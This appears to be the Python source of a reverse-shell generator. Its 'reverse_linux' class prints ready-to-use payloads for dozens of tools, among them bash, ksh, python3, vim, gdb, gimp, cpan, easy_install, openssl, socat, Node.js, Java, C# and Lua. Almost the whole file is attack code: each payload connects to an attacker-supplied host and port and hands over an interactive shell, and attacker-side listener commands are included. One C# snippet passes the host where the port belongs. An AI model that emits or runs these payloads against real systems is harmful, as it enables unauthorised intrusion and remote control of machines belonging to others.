...
class reverse_linux():
	...
	def main(self):
		payloads=['all','python','python3','socket','rvim','vim','openssl','rview','view','ksh','gimp','gdb','irb','cpan','easyinstall','bash','netcat','c','c#','haskell','perl','php','ruby','socat','nodejs','java','javascript','telnet','zsh','lua','golang','vlang','awk','dart']

		if not self.payload in payloads:
			print(f'{TerminalColor.Red}Invalid payload{TerminalColor.Reset}')

		print(f'{TerminalColor.Orange}######## LINUX ########{TerminalColor.Reset}')
		...
		if self.payload=='all' or self.payload=='dart':
			print(self.dart())
		if self.payload=='all' or self.payload=='cpan':
			print(self.cpan())
		if self.payload=='all' or self.payload=='easyinstall':
			print(self.easyinstall())
		if self.payload=='all' or self.payload=='gdb':
			print(self.gdb())
		if self.payload=='all' or self.payload=='gimp':
			print(self.gimp())
		if self.payload=='all' or self.payload=='irb':
			print(self.irb())
		if self.payload=='all' or self.payload=='ksh':
			print(self.ksh())
		if self.payload=='all' or self.payload=='openssl':
			print(self.openssl())
		if self.payload=='all' or self.payload=='rview' or self.payload=='view':
			print(self.rview())
		if self.payload=='all' or self.payload=='rvim' or self.payload=='vim':
			print(self.rvim())
		if self.payload=='all' or self.payload=='socket':
			print(self.socket())
	...
	def socket(self):
		return f'''
{TerminalColor.Orange}#SOCKET
{TerminalColor.Cyan}socket -qvp '{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i' {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}
		'''

	def rvim(self):
		return f'''
{TerminalColor.Orange}#RVIM

This requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:{TerminalColor.Green}{self.lport}{TerminalColor.Orange} on the attacker box to receive the shell.

{TerminalColor.Cyan}rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect(({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},int({TerminalColor.Green}{self.lport}{TerminalColor.Cyan})))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")
vim.command(":q!")'
		'''

	def rview(self):
		return f'''
{TerminalColor.Orange}#RVIEW

This requires that rview is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:{TerminalColor.Green}{self.lport}{TerminalColor.Orange} on the attacker box to receive the shell.

{TerminalColor.Cyan}rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect(({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},int({TerminalColor.Green}{self.lport}{TerminalColor.Cyan})))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")
vim.command(":q!")'
	...
	def openssl(self):
		return f'''
{TerminalColor.Orange}#OPENSSL
{TerminalColor.Orange}To receive the shell run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port {TerminalColor.Green}{self.lport}{TerminalColor.Orange}

Communication between attacker and target will be encrypted.

{TerminalColor.Cyan}mkfifo /tmp/s; {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} > /tmp/s; rm /tmp/s
		'''

	def ksh(self):
		return f'''
{TerminalColor.Orange}#KSH
{TerminalColor.Cyan}ksh -c 'ksh -i > /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 2>&1 0>&1'
		'''

	def irb(self):
		return f'''
{TerminalColor.Orange}#IRB
{TerminalColor.Cyan}irb
require 'socket'; exit if fork;c=TCPSocket.new({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});'''+'''while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
		'''

	def gimp(self):
		return f'''
{TerminalColor.Orange}#GIMP
{TerminalColor.Cyan}gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket();s.connect(({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},int({TerminalColor.Green}{self.lport}{TerminalColor.Cyan})));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'
		'''
...
{TerminalColor.Cyan}python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'
	...
	def gdb(self):
		return f'''
{TerminalColor.Orange}#GDB
{TerminalColor.Cyan}gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket();s.connect(({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},int({TerminalColor.Green}{self.lport}{TerminalColor.Cyan})));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")' -ex quit
		'''

	def easyinstall(self):
		return f'''
{TerminalColor.Orange}#EASY INSTALL
{TerminalColor.Cyan}TF=$(mktemp -d);echo 'import sys,socket,os,pty;s=socket.socket();s.connect(({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan},int({TerminalColor.Green}{self.lport}{TerminalColor.Cyan})));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")' > $TF/setup.py;easy_install $TF
		'''

	def cpan(self):
		return f'''
{TerminalColor.Orange}#CPAN
{TerminalColor.Cyan}cpan;! use Socket; my $i="{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}"; my $p={TerminalColor.Green}{self.lport}{TerminalColor.Cyan}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'''{open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");'''+f''' exec("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+''' -i");};
		'''

	def bash(self):
		return f'''
{TerminalColor.Orange}#BASH -c
{TerminalColor.Cyan}bash -c 'exec bash -i &>/dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} <&1'

{TerminalColor.Orange}#BASH i
{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}-i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0>&1
...
namespace ConnectBack'''+'''
{
	public class Program
	{
		...
		{
			using(TcpClient client = new TcpClient("'''+f'''{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}'''+'''))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						...
						p.StartInfo.FileName = "'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+'''";
...
namespace BackConnect '''+'''{
  class ReverseBash {
	public static void Main(string[] args) {
	  ...
	  proc.StartInfo.FileName = "'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";
	  proc.StartInfo.Arguments = "-c \\"'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}'''+''' 0>&1\\"";
...
{TerminalColor.Orange}#SOCAT #3

Run socat file:`tty`,raw,echo=0 tcp-listen:{TerminalColor.Green}{self.lport}{TerminalColor.Orange} on the attacker box to receive the shell.

{TerminalColor.Cyan}socat tcp-connect:{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} exec:{TerminalColor.Green}{self.shell}{TerminalColor.Cyan},pty,stderr,setsid,sigint,sane
		'''
...
{TerminalColor.Orange}NODEJS #3
{TerminalColor.Cyan}node -e 'sh = require("child_process").spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}");
require("net").connect({TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}, {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}, function ()'''+''' {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
...
{TerminalColor.Orange}#JAVA JJS
{TerminalColor.Cyan}echo 'var host={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan};
var port={TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", "-i").redirectErrorStream(true).start();
...
'''+f'''
{TerminalColor.Orange}#JAVA JRUNSCRIPT
{TerminalColor.Cyan}jrunscript -e 'var host='"{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}"'; var port='"{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}"';
var p=new java.lang.ProcessBuilder("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", "-i").redirectErrorStream(true).start();
...
{TerminalColor.Cyan}lua -e "require('socket');require('os');t=socket.tcp();t:connect('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}','{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}');os.execute('{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i <&3 >&3 2>&3');"

{TerminalColor.Orange}#LUA #2
